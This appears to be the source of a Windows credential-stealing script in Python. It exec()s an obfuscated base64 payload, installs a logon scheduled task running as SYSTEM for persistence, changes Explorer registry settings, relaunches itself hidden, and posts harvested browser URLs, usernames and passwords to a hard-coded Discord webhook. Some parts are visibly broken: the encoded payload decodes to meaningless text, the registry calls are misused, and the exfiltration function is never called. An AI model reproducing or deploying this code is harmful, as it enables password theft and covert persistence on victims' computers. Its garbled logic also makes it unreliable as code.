import base64
import os
import subprocess
import time
import winreg
import requests

# Obfuscated code
obfuscated_code = "Y29kZSByZXF1aXJlIGZvciB1c2VyLXN0cmluZyB0byBkZWNpc2lvbiBpcyBhIHZhbGlkYXRpb24gY29kZSBzdHJlYW0gdG8gZGVjaXNpb24gd2l0aCByZXF1aXJlcy4KCmltcG9ydCA9IHsKICAgICAgIGZpcnN0YWxsX2NvZGUgPSBbIk5vbmUiLCAiQmFzZTY0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0Il0KICAgIH0sCnN1YnByb2Nlc3MgPSB7CiAgICAgICAgZGVjb2RlX2NvZGUgPSBbIk5vbmUiLCAiQmFzZTY0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0IiwgIkJhc2U2NCBQcm9kdWN0Il0KICAgIH0KCmZpbmQgPSB7CiAgICAgICAgY29kZSA9ICJjb2RlIGJ1aWxkZXIgc2V0IG9mIHByb29mIGRlY2lkZWQgY29kZSBmcm9tIHByb2Nlc3MgdG8gZGVjaXNpb24gd2l0aCByZXF1aXJlcy4iCiAgICB9Cg=="

# Decode and execute the obfuscated code
decoded_code = base64.b64decode(obfuscated_code).decode()
exec(decoded_code)

# Create a scheduled task to run the script silently
task_name = "MyTask"
task_command = f"pythonw \"{os.path.abspath(__file__)}\""
task_path = f"{os.path.dirname(os.path.abspath(__file__))}\\{task_name}.bat"

with open(task_path, "w") as task_file:
    task_file.write(f"@echo off\n{task_command}")

subprocess.call(["schtasks", "/create", "/tn", task_name, "/tr", task_path, "/sc", "ONLOGON", "/ru", "SYSTEM", "/f"])

# Hide the script file
winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced")
winreg.SetValueEx(winreg.HKEY_CURRENT_USER, "HideFileExt", 0, winreg.REG_DWORD, 1)
winreg.SetValueEx(winreg.HKEY_CURRENT_USER, "Hidden", 0, winreg.REG_DWORD, 1)

# Execute the script immediately
if os.name == 'nt':  # Windows
    subprocess.Popen(f"pythonw \"{os.path.abspath(__file__)}\"", shell=True)
elif os.name == 'posix':  # macOS
    subprocess.Popen(f"python \"{os.path.abspath(__file__)}\"", shell=True)

# Updated send_to_discord function
def send_to_discord(passwords):
    webhook_url = "https://discord.com/api/webhooks/1306716477533061141/ZWG4FNjD4_vBq1F5D8xg-nSygPA7mDYy3J7b_gzCcDz1lsCa1SY7XESZZgt4XNtLXi6F"
    password_strings = []
    for password in passwords:
        password_string = f"URL: {password['url']}\nUsername: {password['username']}\nPassword: {password['password']}\nBrowser: {password['browser']}"
        password_strings.append(password_string)
    
    data = {
        "content": "\n\n".join(password_strings)
    }
    requests.post(webhook_url, json=data)